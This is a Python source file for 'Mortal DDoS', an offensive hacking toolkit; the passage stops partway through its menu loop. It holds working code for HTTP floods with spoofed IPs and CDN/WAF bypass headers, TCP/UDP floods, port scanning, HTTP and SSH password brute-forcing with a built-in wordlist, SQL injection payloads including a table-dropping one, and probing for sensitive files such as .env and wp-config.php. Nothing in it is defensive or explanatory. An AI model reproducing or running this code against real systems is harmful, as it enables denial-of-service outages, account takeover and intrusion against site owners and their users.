# -*- coding: utf-8 -*-
import threading, sys, time, os, socket, random, subprocess, ssl, struct, hashlib, json, re
import requests
import cloudscraper
from colorama import Fore, Style, init
import urllib3
urllib3.disable_warnings()

init(autoreset=True)

# --- AUTO INSTALL MISSING LIBRARIES ---
def bootstrap():
    print(f"{Fore.RED}[+] Initializing Mortal DDoS...")
    required_libs = ["requests", "cloudscraper", "colorama"]
    for lib in required_libs:
        try:
            __import__(lib)
        except ImportError:
            print(f"{Fore.YELLOW}[!] Missing {lib} - Installing...")
            try:
                subprocess.run([sys.executable, "-m", "pip", "install", lib], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
                print(f"{Fore.GREEN}[+] Successfully installed {lib}")
            except subprocess.CalledProcessError:
                print(f"{Fore.RED}[-] Failed to install {lib}")
                if lib == "cloudscraper":
                    print(f"{Fore.YELLOW}[!] Try installing manually: pip install cloudscraper")

bootstrap()

# --- GLOBAL VARIABLES ---
packet_count = 0
lock = threading.Lock()
stop_attack = False

# --- CORE DATABASES ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
] * 30

SQLI_PAYLOADS = [
    "' OR 1=1--", "' UNION SELECT NULL--", "admin' --", "' AND 1=2--", "') OR ('1'='1",
    "'; DROP TABLE users; --", "' OR '1'='1", "' OR 1=1#", "' OR 1=1/*", "admin'--",
    "admin'/*", "admin'#", "' OR 'x'='x", "' OR 1=1-- -", "' UNION ALL SELECT 1,2,3--",
    "admin' AND 1=1--", "' OR 'a'='a'--", "' OR 1=1 LIMIT 1--", "' OR 'unusual' = 'unusual'",
    "' OR 1=1 AND '1'='1", "admin' OR '1'='1", "' OR '1'='1' --", "' OR 'foo' = 'foo'"
]

VULN_PATHS = [
    "/admin/", "/login.php", "/wp-login.php", "/administrator/", "/config.php", 
    "/backup.sql", "/shell.php", "/phpinfo.php", "/robots.txt", "/.git/config", 
    "/.env", "/wp-config.php", "/configuration.php", "/web.config", "/settings.php",
    "/db.php", "/database.php", "/connect.php", "/setup.php", "/install.php",
    "/debug.php", "/test.php", "/upload.php", "/uploads/", "/files/", "/download.php"
] * 20

PASSWORD_LIST = [
    "admin", "123456", "password", "admin123", "qwerty", "root", "toor", "pass", 
    "guest", "default", "administrator", "login", "welcome", "1234", "12345",
    "123456789", "12345678", "abc123", "monkey", "dragon", "iloveyou", "princess",
    "master", "1234567890", "computer", "1234567", "internet", "michael", "jessica"
]

# --- WAF BYPASS HEADERS ---
WAF_BYPASS_HEADERS = [
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Forwarded-For': '10.0.0.1'},
    {'X-Forwarded-For': '172.16.0.1'},
    {'X-Forwarded-For': '192.168.1.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'X-Remote-IP': '127.0.0.1'},
    {'X-Remote-Addr': '127.0.0.1'},
    {'X-Client-IP': '127.0.0.1'},
    {'True-Client-IP': '127.0.0.1'},
    {'CF-Connecting-IP': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'}
]

# --- CDN/WAF SPECIFIC HEADERS ---
CDN_BYPASS_HEADERS = {
    'Cloudflare': [
        {'CF-Connecting-IP': '127.0.0.1'},
        {'True-Client-IP': '127.0.0.1'},
        {'X-Forwarded-For': '127.0.0.1, 127.0.0.2'},
        {'X-Forwarded-Host': 'localhost'},
        {'X-Original-URL': '/'},
        {'X-Rewrite-URL': '/'}
    ],
    'Akamai': [
        {'X-Forwarded-For': '127.0.0.1'},
        {'Fastly-Debug': '1'},
        {'X-Forwarded-Host': 'localhost'},
        {'X-Original-URL': '/'},
        {'X-Rewrite-URL': '/'}
    ],
    'Imperva': [
        {'X-Forwarded-For': '127.0.0.1'},
        {'True-Client-IP': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'},
        {'X-Original-For': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'}
    ],
    'OVHcloud': [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'}
    ],
    'home.pl': [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'}
    ],
    'cyber_Folks': [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'}
    ],
    'dhosting': [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'}
    ],
    'NGINX': [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Original-Forwarded-For': '127.0.0.1'}
    ]
}
# --- PROXY MANAGEMENT ---
class ProxyManager:
    @staticmethod
    def load_from_file(filename):
        """Load proxies from a text file"""
        proxies = []
        try:
            with open(filename, 'r') as f:
                proxies = [line.strip() for line in f if line.strip() and ':' in line]
            print(f"{Fore.GREEN}[+] Loaded {len(proxies)} proxies from {filename}")
        except FileNotFoundError:
            print(f"{Fore.RED}[-] Proxy file {filename} not found")
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading proxies: {e}")
        return proxies

    @staticmethod
    def fetch_from_api():
        """Fetch proxies from public APIs"""
        print(f"{Fore.YELLOW}[+] Fetching proxies from API...")
        proxies = []
        try:
            response = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=all&timeout=5000&country=all&ssl=all&anonymity=all", timeout=10)
            if response.status_code == 200:
                proxies = [line.strip() for line in response.text.split('\n') if line.strip() and ':' in line]
            print(f"{Fore.GREEN}[+] Fetched {len(proxies)} proxies from API")
        except Exception as e:
            print(f"{Fore.RED}[-] Error fetching proxies: {e}")
        return proxies

    @staticmethod
    def get_proxy_choice():
        """Get proxy option from user"""
        print(f"\n{Fore.CYAN}Proxy Options:")
        print("[1] Load from file")
        print("[2] Fetch from API")
        print("[3] None (direct connection)")
        
        choice = input(f"{Fore.RED}Select proxy option: {Fore.WHITE}")
        proxies = []
        
        if choice == "1":
            filename = input(f"{Fore.CYAN}Enter proxy file name (default: proxies.txt): {Fore.WHITE}") or "proxies.txt"
            proxies = ProxyManager.load_from_file(filename)
        elif choice == "2":
            proxies = ProxyManager.fetch_from_api()
        elif choice == "3":
            print(f"{Fore.YELLOW}[!] Using direct connection (no proxies)")
        else:
            print(f"{Fore.RED}[-] Invalid choice, using direct connection")
            
        return proxies

# --- ADVANCED DDoS ENGINE ---
class MortalDDoS:
    def __init__(self):
        self.proxies = []
        self.packet_count = 0
        self.stop_attack = False
        self.target_cdn = None

    def validate_target(self, target):
        """Validate target URL or IP"""
        if not target:
            return False
        if "http://" not in target and "https://" not in target:
            if not self.is_valid_ip(target):
                print(f"{Fore.RED}[-] Invalid target format. Use http:// or https:// for URLs, or valid IP for IPs")
                return False
        return True

    def is_valid_ip(self, ip):
        """Check if string is valid IP address"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def detect_cdn(self, target):
        """Detect CDN/WAF provider"""
        try:
            response = requests.get(target, timeout=10)
            headers = response.headers
            server_header = headers.get('Server', '').lower()
            cf_ray = headers.get('CF-RAY')
            powered_by = headers.get('X-Powered-By', '').lower()
            
            # Sprawdź Cloudflare
            if cf_ray or 'cloudflare' in server_header or 'cf-' in str(headers).lower():
                self.target_cdn = 'Cloudflare'
                print(f"{Fore.GREEN}[+] Detected CDN: Cloudflare")
                return
                
            # Sprawdź inne CDN/WAF
            if 'akamai' in server_header:
                self.target_cdn = 'Akamai'
                print(f"{Fore.GREEN}[+] Detected CDN: Akamai")
            elif 'imperva' in server_header or 'incapsula' in server_header:
                self.target_cdn = 'Imperva'
                print(f"{Fore.GREEN}[+] Detected WAF: Imperva")
            elif 'ovh' in server_header:
                self.target_cdn = 'OVHcloud'
                print(f"{Fore.GREEN}[+] Detected Provider: OVHcloud")
            elif 'nginx' in server_header or 'nginx' in powered_by:
                self.target_cdn = 'NGINX'
                print(f"{Fore.GREEN}[+] Detected Server: NGINX")
            elif 'home.pl' in target or 'home.pl' in server_header:
                self.target_cdn = 'home.pl'
                print(f"{Fore.GREEN}[+] Detected Provider: home.pl")
            elif 'cyberfolks' in server_header or 'cyber' in server_header:
                self.target_cdn = 'cyber_Folks'
                print(f"{Fore.GREEN}[+] Detected Provider: cyber_Folks")
            elif 'dhosting' in server_header:
                self.target_cdn = 'dhosting'
                print(f"{Fore.GREEN}[+] Detected Provider: dhosting")
            else:
                print(f"{Fore.YELLOW}[!] No known CDN/WAF detected")
                self.target_cdn = None
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error detecting CDN: {e}")
            self.target_cdn = None

    def get_bypass_headers(self):
        """Get appropriate bypass headers for detected CDN"""
        if self.target_cdn and self.target_cdn in CDN_BYPASS_HEADERS:
            return random.choice(CDN_BYPASS_HEADERS[self.target_cdn])
        return random.choice(WAF_BYPASS_HEADERS)

    def layer7_ddos(self, target, duration, threads=100, proxies=None, bypass_waf=True):
        """Advanced Layer 7 DDoS with WAF bypass techniques"""
        if not self.validate_target(target):
            print(f"{Fore.RED}[-] Invalid target!")
            return
            
        global packet_count, stop_attack
        stop_attack = False
        packet_count = 0
        self.proxies = proxies or []
        
        # Detect CDN/WAF
        if bypass_waf:
            print(f"{Fore.CYAN}[+] Detecting CDN/WAF...")
            self.detect_cdn(target)
        
        # Use scraper for better bypass
        try:
            scraper = cloudscraper.create_scraper()
        except:
            print(f"{Fore.YELLOW}[!] Cloudscraper not available, using requests")
            scraper = requests.Session()
            
        end_time = time.time() + duration
        
        print(f"{Fore.RED}[+] Starting Layer 7 DDoS on {target}")
        print(f"{Fore.RED}[+] Proxies: {len(self.proxies) if self.proxies else 'None (direct)'}")
        print(f"{Fore.RED}[+] Threads: {threads}")
        print(f"{Fore.RED}[+] Attack duration: {duration} seconds")
        if self.target_cdn:
            print(f"{Fore.RED}[+] Bypassing: {self.target_cdn}")
        else:
            print(f"{Fore.YELLOW}[+] No WAF detected, using generic bypass")
        
        def send_requests():
            global packet_count, stop_attack
            while time.time() < end_time and not stop_attack:
                try:
                    # Randomize IP address
                    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    
                    # Select random proxy if available
                    proxy = random.choice(self.proxies) if self.proxies else None
                    
                    # Base headers with randomization
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept': random.choice([
                            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'application/json',
                            '*/*'
                        ]),
                        'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.9', 'pl-PL,pl;q=0.9']),
                        'Accept-Encoding': random.choice(['gzip, deflate', 'gzip, deflate, br', 'identity']),
                        'Connection': 'keep-alive',
                        'Cache-Control': random.choice(['no-cache', 'no-store', 'max-age=0']),
                        'Pragma': 'no-cache',
                        'Upgrade-Insecure-Requests': '1'
                    }
                    
                    # Add WAF bypass headers - SPECIFIC FOR CLOUDFLARE
                    if bypass_waf:
                        if self.target_cdn == 'Cloudflare':
                            # Cloudflare specific bypass headers
                            headers.update({
                                'CF-Connecting-IP': fake_ip,
                                'True-Client-IP': fake_ip,
                                'X-Forwarded-For': f'{fake_ip}, 127.0.0.1',
                                'X-Real-IP': fake_ip
                            })
                        elif self.target_cdn:
                            # Other CDN specific headers
                            bypass_headers = self.get_bypass_headers()
                            headers.update(bypass_headers)
                            headers.update({'X-Forwarded-For': fake_ip})
                        else:
                            # Generic WAF bypass
                            headers.update({'X-Forwarded-For': fake_ip})
                            headers.update(random.choice(WAF_BYPASS_HEADERS))
                    
                    # Add randomized cookies
                    headers['Cookie'] = f"session={hashlib.md5(os.urandom(32)).hexdigest()}; pref={random.choice(['light', 'dark'])}; lang={random.choice(['en', 'pl', 'de'])}"
                    # Random HTTP methods for better bypass
                    http_methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT']
                    method = random.choice(http_methods)
                    
                    # Payload for POST/PUT requests
                    payload = {
                        'data': random.choice(['login', 'search', 'query', 'action', 'submit']),
                        'value': str(random.randint(1000, 999999)),
                        'timestamp': str(int(time.time())),
                        'random': hashlib.md5(os.urandom(16)).hexdigest(),
                        'token': hashlib.sha256(os.urandom(32)).hexdigest()
                    }
                    
                    # Make request with proxy if available
                    if proxy:
                        proxies_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
                        if method in ['POST', 'PUT']:
                            response = scraper.request(method, target, headers=headers, data=payload, 
                                                     proxies=proxies_dict, timeout=3, verify=False)
                        else:
                            response = scraper.request(method, target, headers=headers, 
                                                     proxies=proxies_dict, timeout=3, verify=False)
                    else:
                        if method in ['POST', 'PUT']:
                            response = scraper.request(method, target, headers=headers, data=payload, 
                                                     timeout=3, verify=False)
                        else:
                            response = scraper.request(method, target, headers=headers, 
                                                     timeout=3, verify=False)
                    
                    with lock:
                        packet_count += 1
                        sys.stdout.write(f"\r{Fore.GREEN}[+] Requests sent: {packet_count} | Status: {response.status_code} | Method: {method}")
                        sys.stdout.flush()
                        
                except Exception as e:
                    # Silent fail to maintain attack speed
                    pass
        
        # Start threads
        thread_list = []
        for _ in range(min(threads, 500)):  # Limit threads to prevent overload
            thread = threading.Thread(target=send_requests)
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        
        # Wait for completion
        time.sleep(duration)
        stop_attack = True
        
        for thread in thread_list:
            thread.join()
        
        print(f"\n{Fore.CYAN}[+] Layer 7 DDoS Attack Completed!")
        print(f"{Fore.CYAN}[+] Total requests sent: {packet_count}")

    def layer4_ddos(self, ip, port, duration, protocol="tcp"):
        """Enhanced Layer 4 DDoS with better performance"""
        # Validate IP
        if not self.is_valid_ip(ip):
            print(f"{Fore.RED}[-] Invalid IP address!")
            return
            
        # Validate port
        if not (1 <= port <= 65535):
            print(f"{Fore.RED}[-] Invalid port number! Must be between 1-65535")
            return
            
        global packet_count, stop_attack
        stop_attack = False
        packet_count = 0
        end_time = time.time() + duration
        
        print(f"{Fore.RED}[+] Starting Layer 4 {protocol.upper()} DDoS on {ip}:{port}")
        print(f"{Fore.RED}[+] Attack duration: {duration} seconds")
        print(f"{Fore.RED}[+] Protocol: {protocol.upper()}")
        
        def send_packets():
            global packet_count, stop_attack
            while time.time() < end_time and not stop_attack:
                try:
                    # Create randomized payload
                    payload_size = random.randint(64, 2048)
                    payload = os.urandom(payload_size)
                    
                    if protocol.lower() == "udp":
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.sendto(payload, (ip, port))
                        sock.close()
                    else:  # TCP
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        try:
                            sock.connect((ip, port))
                            sock.send(payload)
                        except:
                            pass
                        finally:
                            sock.close()
                    
                    with lock:
                        packet_count += 1
                        if packet_count % 100 == 0:
                            sys.stdout.write(f"\r{Fore.GREEN}[+] {protocol.upper()} packets sent: {packet_count}")
                            sys.stdout.flush()
                            
                except:
                    pass
        
        # Start threads
        thread_list = []
        thread_count = 200 if protocol.lower() == "udp" else 100
        
        print(f"{Fore.RED}[+] Starting {thread_count} threads for L4 attack")
        
        for _ in range(thread_count):
            thread = threading.Thread(target=send_packets)
            thread.daemon = True
            thread.start()
            thread_list.append(thread)
        
        # Monitor progress
        start_time = time.time()
        while time.time() < end_time and not stop_attack:
            time.sleep(1)
            elapsed = time.time() - start_time
            if elapsed > 0:
                rate = packet_count / elapsed
                sys.stdout.write(f"\r{Fore.GREEN}[+] Packets: {packet_count} | Rate: {rate:.0f} pkt/s")
                sys.stdout.flush()
        
        stop_attack = True
        
        # Wait for threads to complete
        for thread in thread_list:
            thread.join(timeout=1)
        
        print(f"\n{Fore.CYAN}[+] Layer 4 {protocol.upper()} DDoS Attack Completed!")
        print(f"{Fore.CYAN}[+] Total packets sent: {packet_count}")
# --- INFORMATION GATHERING ---
class InformationGathering:
    @staticmethod
    def port_scanner(ip, start_port=1, end_port=65535):
        """Comprehensive port scanner with full range support"""
        # Validate IP
        try:
            socket.inet_aton(ip)
        except socket.error:
            print(f"{Fore.RED}[-] Invalid IP address!")
            return []
            
        print(f"{Fore.CYAN}[+] Scanning ports {start_port}-{end_port} on {ip}...")
        open_ports = []
        
        try:
            for port in range(start_port, min(end_port + 1, 65536)):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        service = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
                                  80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 3389: "RDP"}.get(port, "Unknown")
                        print(f"{Fore.GREEN}[+] Port {port} ({service}): OPEN")
                        open_ports.append(port)
                    sock.close()
                except Exception as e:
                    if 'sock' in locals():
                        sock.close()
                    continue
        except Exception as e:
            print(f"{Fore.RED}[-] Error during port scan: {e}")
        
        if not open_ports:
            print(f"{Fore.RED}[-] No open ports found")
        return open_ports

    @staticmethod
    def host_to_ip(hostname):
        """Resolve hostname to IP address"""
        try:
            ip = socket.gethostbyname(hostname)
            print(f"{Fore.GREEN}[+] {hostname} -> {ip}")
            return ip
        except:
            print(f"{Fore.RED}[-] Could not resolve hostname: {hostname}")
            return None

    @staticmethod
    def nmap_scan(ip):
        """Fixed Nmap scan with proper error handling"""
        # Validate IP
        try:
            socket.inet_aton(ip)
        except socket.error:
            print(f"{Fore.RED}[-] Invalid IP address!")
            return []
            
        try:
            print(f"{Fore.CYAN}[+] Performing Nmap-like scan on {ip}...")
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5900, 8080, 8443]
            open_ports = []
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        service = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
                                  80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 3389: "RDP"}.get(port, "Unknown")
                        print(f"{Fore.GREEN}[+] Port {port} ({service}): OPEN")
                        open_ports.append(port)
                    sock.close()
                except Exception as e:
                    if 'sock' in locals():
                        sock.close()
                    continue
            
            if not open_ports:
                print(f"{Fore.RED}[-] No common ports found open")
            return open_ports
        except Exception as e:
            print(f"{Fore.RED}[-] Error during Nmap scan: {e}")
            return []

# --- PASSWORD ATTACKS ---
class PasswordAttacks:
    @staticmethod
    def load_passwords_from_file(filename):
        """Load passwords from a text file"""
        passwords = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[+] Loaded {len(passwords)} passwords from {filename}")
        except FileNotFoundError:
            print(f"{Fore.RED}[-] Password file {filename} not found")
            return []
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading passwords: {e}")
            return []
        return passwords
    
    @staticmethod
    def http_bruteforce(url, username):
        """HTTP form bruteforce attack with custom password file option"""
        print(f"{Fore.CYAN}[+] Starting HTTP bruteforce on {url}")
        print(f"{Fore.CYAN}[+] Target user: {username}")
        
        # Ask user if they want to use custom password file
        use_custom = input(f"{Fore.CYAN}Use custom password file? (y/n, default n): {Fore.WHITE}").lower()
        passwords = PASSWORD_LIST
        
        if use_custom == 'y':
            filename = input(f"{Fore.CYAN}Enter password file name: {Fore.WHITE}")
            custom_passwords = PasswordAttacks.load_passwords_from_file(filename)
            if custom_passwords:
                passwords = custom_passwords
            else:
                print(f"{Fore.YELLOW}[!] Using default password list")
        
        for password in passwords:
            try:
                print(f"{Fore.YELLOW}[?] Trying: {password}", end='\r')
                response = requests.post(url, data={'username': username, 'password': password}, timeout=3)
                if "dashboard" in response.text.lower() or response.status_code == 302:
                    print(f"{Fore.GREEN}[!] SUCCESS! Password found: {password}")
                    return
            except Exception as e:
                print(f"{Fore.RED}[-] Request error: {e}")
                continue
        
        print(f"{Fore.RED}[-] Password not found in wordlist")

    @staticmethod
    def ssh_bruteforce(host, username):
        """SSH bruteforce attack with custom password file option"""
        try:
            import paramiko
        except ImportError:
            print(f"{Fore.RED}[-] Paramiko library not found. Install with: pip install paramiko")
            return
            
        print(f"{Fore.CYAN}[+] Starting SSH bruteforce on {host}")
        print(f"{Fore.CYAN}[+] Target user: {username}")
        
        # Ask user if they want to use custom password file
        use_custom = input(f"{Fore.CYAN}Use custom password file? (y/n, default n): {Fore.WHITE}").lower()
        passwords = PASSWORD_LIST
        
        if use_custom == 'y':
            filename = input(f"{Fore.CYAN}Enter password file name: {Fore.WHITE}")
            custom_passwords = PasswordAttacks.load_passwords_from_file(filename)
            if custom_passwords:
                passwords = custom_passwords
            else:
                print(f"{Fore.YELLOW}[!] Using default password list")
        
        for password in passwords:
            try:
                print(f"{Fore.YELLOW}[?] Trying: {password}", end='\r')
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, username=username, password=password, timeout=3)
                print(f"{Fore.GREEN}[!] SUCCESS! Password found: {password}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                print(f"{Fore.RED}[-] SSH connection error: {e}")
                continue
        
        print(f"{Fore.RED}[-] Password not found in wordlist")
# --- WEB HACKING ---
class WebHacking:
    @staticmethod
    def sqli_scanner(url):
        """Scan for SQL injection vulnerabilities"""
        print(f"{Fore.CYAN}[+] Scanning {url} for SQL injection...")
        
        for payload in SQLI_PAYLOADS:
            try:
                test_url = f"{url}?id={payload}"
                response = requests.get(test_url, timeout=5)
                if any(keyword in response.text.lower() for keyword in ['mysql', 'syntax', 'sql', 'error']):
                    print(f"{Fore.GREEN}[!] Possible SQLi found: {test_url}")
                    return
            except:
                pass
        
        print(f"{Fore.RED}[-] No SQLi vulnerabilities detected")

    @staticmethod
    def directory_finder(url):
        """Find sensitive directories and files"""
        print(f"{Fore.CYAN}[+] Searching directories on {url}")
        
        for path in VULN_PATHS:
            try:
                full_url = url.rstrip('/') + path
                response = requests.head(full_url, timeout=3)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[!] Found: {full_url}")
            except:
                pass
        
        print(f"{Fore.CYAN}[+] Directory search completed")
    
    @staticmethod
    def cms_detector(url):
        """Detect CMS of a website with improved error handling"""
        try:
            print(f"{Fore.CYAN}[+] Detecting CMS for {url}...")
            response = requests.get(url, timeout=10)
            headers = response.headers
            content = response.text.lower()
            
            # CMS detection patterns
            cms_patterns = {
                'WordPress': ['wp-content', 'wordpress', '/wp-includes/', 'xmlns="http://wordpress.org/export'],
                'Joomla': ['joomla', 'com_content', 'Joomla!', '/templates/joomla/'],
                'Drupal': ['drupal', 'sites/all/themes', 'Powered by Drupal'],
                'Magento': ['magento', 'Mage.Cookies', 'catalog/product_view'],
                'Shopify': ['shopify', 'myshopify.com'],
                'Ghost': ['ghost-blog', 'ghost.org'],
                'PrestaShop': ['prestashop', 'ps_languages', 'blockcart'],
                'OpenCart': ['opencart', 'index.php?route='],
                'TYPO3': ['typo3', 'tx_solr', 't3lib'],
                'Concrete5': ['concrete5', 'ccm-layout-area']
            }
            
            detected_cms = []
            for cms, patterns in cms_patterns.items():
                if any(pattern in content for pattern in patterns) or \
                   any(cms.lower() in str(value).lower() for value in headers.values()):
                    detected_cms.append(cms)
            
            if detected_cms:
                print(f"{Fore.GREEN}[!] Detected CMS: {', '.join(detected_cms)}")
            else:
                print(f"{Fore.YELLOW}[!] No known CMS detected")
                
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Network error detecting CMS: {e}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error detecting CMS: {e}")

# --- MAIN INTERFACE ---
class MortalInterface:
    @staticmethod
    def banner():
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.RED}{Style.BRIGHT}")
        print(f"""{Fore.WHITE}
 /$$      /$$                       /$$               /$$ /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ 
| $$$    /$$$                      | $$              | $$| $$__  $$| $$__  $$ /$$__  $$ /$$__  $$
| $$$$  /$$$$  /$$$$$$   /$$$$$$  /$$$$$$    /$$$$$$ | $$| $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
| $$ $$/$$ $$ /$$__  $$ /$$__  $$|_  $$_/   |____  $$| $$| $$  | $$| $$  | $$| $$  | $$|  $$$$$$ 
{Fore.RED}| $$  $$$| $$| $$  \ $$| $$  \__/  | $$      /$$$$$$$| $$| $$  | $$| $$  | $$| $$  | $$ \____  $$
| $$\  $ | $$| $$  | $$| $$        | $$ /$$ /$$__  $$| $$| $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
| $$ \/  | $$|  $$$$$$/| $$        |  $$$$/|  $$$$$$$| $$| $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
|__/     |__/ \______/ |__/         \___/   \_______/|__/|_______/ |_______/  \______/  \______/ """)
        print(f"{Fore.CYAN}" + "="*60)
        print(f"{Fore.RED}Devs: KapiczeK and I Love Pizza {Fore.WHITE}|{Fore.RED} MortalDDOS Discord: {Fore.GREEN}https://discord.gg/GZv42uqH")
        print(f"{Fore.CYAN}" + "="*60)

    @staticmethod
    def main_menu():
        print(f"\n[1]  {Fore.RED}Layer 7 DDoS Attack (HTTP/HTTPS)")
        print(f"[2]  {Fore.RED}Layer 4 DDoS Attack (TCP/UDP)")
        print(f"[3]  {Fore.RED}Information Gathering")
        print(f"[4]  {Fore.RED}Password Attacks")
        print(f"[5]  {Fore.RED}Web Hacking")
        print(f"[0]  {Fore.RED}Exit")
        print(f"{Fore.CYAN}" + "="*60)

    @staticmethod
    def info_gathering_menu():
        print("\n[1]  Nmap Scan")
        print("[2]  Host to IP")
        print("[3]  Port Scanner (Full Range)")
        print("[0]  Back")

    @staticmethod
    def password_attacks_menu():
        print("\n[1]  HTTP Bruteforce")
        print("[2]  SSH Bruteforce")
        print("[0]  Back")

    @staticmethod
    def web_hacking_menu():
        print("\n[1]  SQL Injection Scanner")
        print("[2]  Directory Finder")
        print("[3]  CMS Detector")
        print("[0]  Back")

    @staticmethod
    def run():
        ddos_engine = MortalDDoS()
        info_gather = InformationGathering()
        proxy_manager = ProxyManager()
        passwd_attack = PasswordAttacks()
        web_hack = WebHacking()
        
        while True:
            MortalInterface.banner()
            MortalInterface.main_menu()
            
            choice = input(f"\n{Fore.RED}Mortal@DDoS: {Fore.RESET}")
            
            if choice == "1":
                target = input(f"{Fore.CYAN}Target URL (with http:// or https://): {Fore.WHITE}")
                if not target:
                    print(f"{Fore.RED}[-] Target cannot be empty!")
                    input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    continue
                    
                try:
                    duration = int(input(f"{Fore.CYAN}Attack Duration (seconds): {Fore.WHITE}"))
                    if duration <= 0:
                        print(f"{Fore.RED}[-] Duration must be positive!")
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                        continue
                except ValueError:
                    print(f"{Fore.RED}[-] Invalid duration!")
                    input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    continue
                    
                try:
                    threads = int(input(f"{Fore.CYAN}Threads (1-1000, default 100): {Fore.WHITE}") or "100")
                    threads = max(1, min(threads, 1000))
                except ValueError:
                    threads = 100
                    print(f"{Fore.YELLOW}[!] Invalid threads, using default: 100")
                
                # Proxy selection
                proxies = proxy_manager.get_proxy_choice()
                
                # WAF bypass option
                bypass_choice = input(f"{Fore.CYAN}Enable WAF bypass? (y/n, default y): {Fore.WHITE}").lower() or "y"
                bypass_waf = bypass_choice == "y"
                
                print(f"{Fore.YELLOW}[+] Starting Layer 7 DDoS Attack...")
                ddos_engine.layer7_ddos(target, duration, threads, proxies, bypass_waf)
                input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                
            elif choice == "2":
                ip = input(f"{Fore.CYAN}Target IP: {Fore.WHITE}")
                if not ip:
                    print(f"{Fore.RED}[-] IP cannot be empty!")
                    input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    continue
                    
                try:
                    port = int(input(f"{Fore.CYAN}Port (1-65535): {Fore.WHITE}"))
                    if not (1 <= port <= 65535):
                        print(f"{Fore.RED}[-] Invalid port number!")
                        input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                        continue
                except ValueError:
                    print(f"{Fore.RED}[-] Invalid port!")
                    input(f"\n{Fore.CYAN}[+] Press Enter to continue...")
                    continue
                    
